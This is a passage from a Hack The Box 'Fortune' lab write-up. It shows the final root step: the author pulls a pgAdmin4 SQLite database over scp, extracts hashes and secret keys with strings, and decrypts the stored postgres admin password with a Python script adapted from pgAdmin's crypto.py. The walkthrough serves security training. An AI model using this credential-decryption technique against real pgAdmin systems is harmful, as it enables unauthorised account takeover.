class="line">Welcome to OpenBSD: The proactively secure Unix-like operating system.</span><br><span class="line">fortune$</span><br></pre></td></tr></table></figure>
<p>In the home directory of <code>charlie</code> there was a file called <code>mbox</code> which had an email from <code>bob</code> to <code>charlie</code> thanking him for setting up <code>pgadmin4</code> for him and also telling him that he set the <code>dba</code> password to the same as root password :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">fortune$ ls -al</span><br><span class="line">total 44</span><br><span class="line">drwxr-x---  3 charlie  charlie  512 Nov  5  2018 .</span><br><span class="line">drwxr-xr-x  5 root     wheel    512 Nov  2  2018 ..</span><br><span class="line">-rw-r-----  1 charlie  charlie   87 Oct 11  2018 .Xdefaults</span><br><span class="line">-rw-r-----  1 charlie  charlie  771 Oct 11  2018 .cshrc</span><br><span class="line">-rw-r-----  1 charlie  charlie  101 Oct 11  2018 .cvsrc</span><br><span class="line">-rw-r-----  1 charlie  charlie  359 Oct 11  2018 .login</span><br><span class="line">-rw-r-----  1 charlie  charlie  175 Oct 11  2018 .mailrc</span><br><span class="line">-rw-r-----  1 charlie  charlie  216 Oct 11  2018 .profile</span><br><span class="line">drwx------  2 charlie  charlie  512 Nov  2  2018 .ssh</span><br><span class="line">-rw-------  1 charlie  charlie  608 Nov  3  2018 mbox</span><br><span class="line">-r--------  1 charlie  charlie   33 Nov  3  2018 user.txt</span><br><span class="line">fortune$ cat mbox                                                                                                                                                                                                 </span><br><span class="line">From bob@fortune.htb Sat Nov  3 11:18:51 2018</span><br><span class="line">Return-Path: &lt;bob@fortune.htb&gt;</span><br><span class="line">Delivered-To: charlie@fortune.htb</span><br><span class="line">Received: from localhost (fortune.htb [local])</span><br><span class="line">        by fortune.htb (OpenSMTPD) with ESMTPA id bf12aa53</span><br><span class="line">        for &lt;charlie@fortune.htb&gt;;</span><br><span class="line">        Sat, 3 Nov 2018 11:18:51 -0400 (EDT)</span><br><span class="line">From:  &lt;bob@fortune.htb&gt;</span><br><span class="line">Date: Sat, 3 Nov 2018 11:18:51 -0400 (EDT)</span><br><span class="line">To: charlie@fortune.htb</span><br><span class="line">Subject: pgadmin4</span><br><span class="line">Message-ID: &lt;196699abe1fed384@fortune.htb&gt;</span><br><span class="line">Status: RO</span><br><span class="line"></span><br><span class="line">Hi Charlie,</span><br><span class="line"></span><br><span class="line">Thanks for setting-up pgadmin4 for me. Seems to work great so far.</span><br><span class="line">BTW: I set the dba password to the same as root. I hope you don&#39;t mind.</span><br><span class="line"></span><br><span class="line">Cheers,</span><br><span class="line"></span><br><span class="line">Bob</span><br><span class="line"></span><br><span class="line">fortune$</span><br></pre></td></tr></table></figure>
<p> Note : <a href="https://www.pgadmin.org/" target="_blank" rel="noopener"><code>pgadmin</code></a> is an administration and development platform for <code>PostgreSQL</code>.<br>Earlier when we got the elevated network access there was an <code>http</code> port for <code>pgadmin4</code> so I checked its web directory in <code>/var/appsrv</code> and the database was there :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fortune$ cd &#x2F;var&#x2F;appsrv&#x2F;                                                                                                                                                                                          </span><br><span class="line">fortune$ ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x   5 root       wheel     512 Nov  2  2018 .</span><br><span class="line">drwxr-xr-x  24 root       wheel     512 Nov  2  2018 ..</span><br><span class="line">drwxr-xr-x   5 _fortune   _fortune  512 Aug  2 09:15 fortune</span><br><span class="line">drwxr-x---   4 _pgadmin4  wheel     512 Nov  3  2018 pgadmin4</span><br><span class="line">drwxr-xr-x   4 _sshauth   _sshauth  512 Feb  3 05:08 sshauth</span><br><span class="line">fortune$ cd pgadmin4&#x2F;                                                                                                                                                                                             </span><br><span class="line">fortune$ ls -la</span><br><span class="line">total 252</span><br><span class="line">drwxr-x---  4 _pgadmin4  wheel     512 Nov  3  2018 .</span><br><span class="line">drwxr-xr-x  5 root       wheel     512 Nov  2  2018 ..</span><br><span class="line">-rw-r-----  1 _pgadmin4  wheel  118784 Nov  3  2018 pgadmin4.db</span><br><span class="line">-rw-r-----  1 _pgadmin4  wheel     479 Nov  3  2018 pgadmin4.ini</span><br><span class="line">drwxr-x---  2 _pgadmin4  wheel     512 Nov  3  2018 sessions</span><br><span class="line">drwxr-x---  3 _pgadmin4  wheel     512 Nov  3  2018 storage</span><br><span class="line">fortune$</span><br></pre></td></tr></table></figure>
<p>I downloaded it on my machine :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;ssh# scp -i id_rsa charlie@fortune.htb:&#x2F;var&#x2F;appsrv&#x2F;pgadmin4&#x2F;pgadmin4.db ..&#x2F;</span><br><span class="line">pgadmin4.db                                                                                                                                                                      100%  116KB   7.7KB&#x2F;s   00:15    </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune&#x2F;ssh#</span><br></pre></td></tr></table></figure>
<p>Then I used <code>strings</code> to see if I can get anything interesting :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune# strings pgadmin4.db</span><br><span class="line">SQLite format 3</span><br><span class="line">indexsqlite_autoindex_debugger_function_arguments_1debugger_function_arguments</span><br><span class="line"></span><br><span class="line">----------------</span><br><span class="line"> Removed Output</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">ConfigDB</span><br><span class="line">	ConfigDB</span><br><span class="line">bob@fortune.htb$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv&#x2F;6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg</span><br><span class="line">charlie@fortune.htb$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ</span><br><span class="line">bob@fortune.htb</span><br><span class="line">3	charlie@fortune.htb</span><br><span class="line"></span><br><span class="line">----------------</span><br><span class="line"> Removed Output</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">9eSECURITY_PASSWORD_SALTqIhAhRt3xq_dzIEqyJQFmWnymFbO1cZVhbQaTWA-v9Q&#x3D;9</span><br><span class="line">!eSECRET_KEYR_EFY1hb236guS3jNq1aHyPcruXbjk7Ff-QwL6PMqJM&#x3D;?</span><br><span class="line">-eCSRF_SESSION_KEYsaQWKx5BCyVZMH2weOiNv3Dsvzh4GchPM16kwBRYPxs&#x3D;</span><br><span class="line"></span><br><span class="line">----------------</span><br><span class="line"> Removed Output</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">8postgresdbautUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY&#x2F;l8Silrmu3caqrtjaVjLQlvFFEgESGzprefer&lt;STORAGE_DIR&gt;&#x2F;.postgresql&#x2F;postgresql.crt&lt;STORAGE_DIR&gt;&#x2F;.postgresql&#x2F;postgresql.key22</span><br><span class="line"></span><br><span class="line">----------------</span><br><span class="line"> Removed Output</span><br><span class="line">----------------</span><br></pre></td></tr></table></figure>
<p>I got some salted hashes, and most importantly this :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postgresdba utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY&#x2F;l8Silrmu3caqrtjaVjLQlvFFEgESGz</span><br></pre></td></tr></table></figure>
<p>This is the db administrator’s password hash and we know that it’s the same as the root password.<br><code>pgadmin</code> is an open-source software so I searched on <code>github</code> for any cryptography related stuff and found this script called <a href="https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py" target="_blank" rel="noopener"><code>crypto.py</code></a>.<br>I took the functions needed to decrypt the hash then I created a script to take the hash/the key and decrypt the hash using the functions from <code>crypto.py</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> division</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> six</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers.algorithms <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers.modes <span class="keyword">import</span> CFB8</span><br><span class="line"></span><br><span class="line">padding_string = <span class="string">b'&#125;'</span></span><br><span class="line">iv_size = AES.block_size // <span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(key)</span>:</span></span><br><span class="line">    <span class="string">"""Add padding to the key."""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isinstance(key, six.text_type):</span><br><span class="line">        key = key.encode()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Key must be maximum 32 bytes long, so take first 32 bytes</span></span><br><span class="line">    key = key[:<span class="number">32</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># If key size is 16, 24 or 32 bytes then padding is not required</span></span><br><span class="line">    <span class="keyword">if</span> len(key) <span class="keyword">in</span> (<span class="number">16</span>, <span class="number">24</span>, <span class="number">32</span>):</span><br><span class="line">        <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add padding to make key 32 bytes long</span></span><br><span class="line">    <span class="keyword">return</span> key.ljust(<span class="number">32</span>, padding_string)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(ciphertext, key)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Decrypt the AES encrypted string.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        ciphertext -- Encrypted string with AES method.</span></span><br><span class="line"><span class="string">        key        -- key to decrypt the encrypted string.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    ciphertext = base64.b64decode(ciphertext)</span><br><span class="line">    iv = ciphertext[:iv_size]</span><br><span class="line"></span><br><span class="line">    cipher = Cipher(AES(pad(key)), CFB8(iv), default_backend())</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    <span class="keyword">return</span> decryptor.update(ciphertext[iv_size:]) + decryptor.finalize()</span><br><span class="line"></span><br><span class="line">ciphertext = raw_input(<span class="string">"hash : "</span>)</span><br><span class="line">key = raw_input(<span class="string">"key : "</span>)</span><br><span class="line">password = decrypt(ciphertext,key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Password : "</span> + password</span><br></pre></td></tr></table></figure>
<p>The only thing left is to give the right key, I tried the other hashes I got from the database as a key and <code>bob</code>‘s hash worked : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv&#x2F;6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune# .&#x2F;decrypt.py </span><br><span class="line">hash : utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY&#x2F;l8Silrmu3caqrtjaVjLQlvFFEgESGz</span><br><span class="line">key : $pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv&#x2F;6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg</span><br><span class="line">[*] Password : R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;fortune#</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/fortune/17.png" alt=""><br>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a><br>Next Hack The Box write-up : <a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-08-03</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/bsd/" rel="tag">#bsd</a> <a class="tag-link" href="/tags/exploit-development/" rel="tag">#exploit-development</a> <a class="tag-link" href="/tags/networking/" rel="tag">#networking</a> <a class="tag-link" href="/tags/php/" rel="tag">#php</a> <a class="tag-link" href="/tags/pivoting/" rel="tag">#pivoting</a> <a class="tag-link" href="/tags/python/" rel="tag">#python</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#ssh</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
